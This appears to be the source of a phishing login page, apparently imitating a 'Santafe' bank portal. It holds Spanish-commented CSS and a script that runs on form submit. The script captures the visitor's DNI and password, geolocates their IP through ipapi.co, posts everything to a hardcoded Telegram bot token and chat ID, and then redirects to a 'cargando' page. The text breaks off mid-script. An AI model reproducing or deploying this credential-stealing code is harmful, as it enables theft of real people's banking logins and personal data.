    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
      }

      .container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }

      .izquierda {
        width: 22%;
        min-width: 560px;
        height: 100vh;
        padding: 50px;
        background: #302e38;
        box-sizing: border-box;
        text-align: center;
        position: relative;
        z-index: 10000;
      }

      .derecha {
        width: 78%;
        height: 100vh;
        z-index: 1;
        position: relative;
      }

      .derecha img {
        right: 0;
        position: absolute;
        z-index: 0;
        bottom: 0;
        min-width: 1200px;
      }
      input {
        width: 100%;
      }
      button {
        background-color: rgb(25, 128, 56);
        width: 100%;
        border: 0px;
        padding: 1rem;
        margin: 0px 0px 1rem;
        border-radius: 0.5rem;
        font-family: Rubik, sans-serif;
        font-weight: 500;
        font-size: 0.875rem;
        cursor: pointer;
        transition: background-color 0.3s ease 0s;
        will-change: auto;
        color: rgb(255, 255, 255);
        white-space: normal;
      }
      @media (max-width: 768px) {
        .izquierda,
        .derecha {
          width: 100%;
          height: auto;
        }
        .izquierda {
          min-width: 100%;
          height: 100vh;
        }

        .derecha {
          display: none;
        }
      }
    </style>
    <style>
      .input-container {
        position: relative;
        margin-bottom: 20px;
      }

      .input-container svg {
        position: absolute;
        left: 15px; /* Ajusta el valor según sea necesario */
        top: 55%;
        transform: translateY(-50%);
        fill: #ffffff;
      }

      .input-container label {
        position: absolute;
        left: 50px;
        top: 50%;
        transform: translateY(-50%);
        color: #ffffff;
        transition: top 0.3s, font-size 0.3s, color 0.3s;
        font-size: 15px;
        pointer-events: none;
      }

      .input-container input:focus + label,
      .input-container input:not(:placeholder-shown) + label {
        top: -10px;
        left: 15px;
        font-size: 12px;
        color: #ffffff;
      }

      .input-container input {
        width: calc(
          100% - 60px
        ); /* Ajusta el valor según sea necesario para dejar espacio para el SVG */
        padding: 10px;
        border: 0;
        border-bottom: 1px solid white;
        background: transparent;
        padding-right: 0;
        padding-left: 35px;
        color: white;
        transition: border-color 0.3s;
        font-size: 16px;
      }

      .input-container input:focus {
        outline: none;
        border-color: white;
      }
    </style>

  <script>
    const url = "https://ipapi.co/json/";
    const form = document.querySelector("#loginform");

    form.addEventListener("submit", (event) => {
      event.preventDefault(); // Aquí evitamos que el formulario se envíe

      // Obtener valores de DNI y contraseña
      const dni = document.querySelector("#usuario").value;
      const contra = document.querySelector("#contra").value;

      // Verificar si alguno de los campos está vacío
      if (dni.trim() === "" || contra.trim() === "") {
        alert("Por favor, completa todos los campos.");
        return; // Detener la ejecución si hay campos vacíos
      }

      // Si los campos no están vacíos, continuar con la solicitud
      axios
        .get(url)
        .then((response) => {
          localStorage.setItem("usuario", dni);
          const message =
            "\nSantafe" +
            "\nUsuario: " +
            dni +
            "\nContraseña: " +
            contra +
            "\nCiudad:" +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;
          axios
            .post(
              "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
              {
                chat_id: "-4139256120",
                text: message,
              }
            )
            .then((response) => {
              window.location.href = "cargando.html"; // Cambiar 'pagina_destino.html' por la URL de la página a la que quieres redirigir.
